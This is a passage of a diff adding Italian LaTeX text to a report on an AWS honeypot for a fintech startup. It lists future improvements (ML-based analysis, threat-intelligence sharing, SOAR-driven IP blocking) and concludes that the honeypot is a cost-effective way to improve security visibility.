+    \item \textbf{Analisi basata su ML/AI}: Utilizzare servizi AWS (es. SageMaker, GuardDuty ML) o strumenti esterni per analizzare i pattern di attacco raccolti e identificare anomalie o minacce emergenti.
+    \item \textbf{Condivisione dell'intelligence}: Contribuire (in modo anonimizzato, se possibile) ai dati raccolti alle piattaforme di threat intelligence per migliorare la sicurezza della comunità.
+    \item \textbf{Integrazione con SOAR}: Automatizzare le risposte agli alert generati dall'honeypot (es. blocco IP a livello di WAF/NACL) tramite piattaforme SOAR (Security Orchestration, Automation and Response).
+\end{itemize}
+
+In conclusione, l'honeypot AWS rappresenta un investimento strategico e tecnicamente fattibile per una startup fintech, migliorando la visibilità sulle minacce e rafforzando la postura di sicurezza complessiva a fronte di un costo gestibile, specialmente se confrontato con i potenziali danni di un incidente di sicurezza.
